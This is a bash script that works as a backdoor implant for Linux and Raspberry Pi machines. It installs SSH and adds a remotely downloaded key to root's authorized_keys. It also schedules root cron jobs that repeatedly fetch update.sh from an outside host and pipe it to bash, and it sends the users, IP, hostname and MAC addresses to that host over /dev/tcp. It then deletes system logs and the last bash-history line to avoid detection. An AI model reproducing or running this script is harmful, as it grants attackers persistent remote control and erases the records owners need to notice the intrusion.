#!/usr/bin/bash
host=boesen.science
down_port=2042
up_port=2043

sudo apt-get install openssh-server -y
sudo systemctl start ssh.service
sudo systemctl enable ssh.service

sshpath="/root/.ssh"

sudo mkdir -p "$sshpath"

echo "Downloading pubkey..."
sudo su -c "curl -L $host:$down_port/pubkey >> $sshpath/authorized_keys"

sudo su -c "(crontab -l 2>/dev/null; echo \"*/20 * * * * curl -L $host:$down_port/linux/update.sh |bash\") | crontab -"
sudo su -c "printf \"#\!/bin/bash\ncurl -L $host:$down_port/linux/update.sh |bash\n\" > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"

# Don't use whoami, will generally be root, which is useless
user=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
# hostname -I returns trailing space
ip=$(hostname -I | sed 's/ *$//')
hostname=$(hostname)
mac=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')

exec 3<>/dev/tcp/$host/$up_port
printf "JOIN: $user $ip $hostname $mac" >&3

cat <&3

printf "$ip" > /tmp/ip

# On Raspberry Pi, prevent "SSH open with default password" warning
sudo rm -rf /etc/profile.d/sshpwd.sh /etc/xdg/lxsession/LXDE-pi/sshpwd.sh /var/log/*
# Remove last line of bash history to prevent detection if typed into terminal
sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history

clear;clear;clear
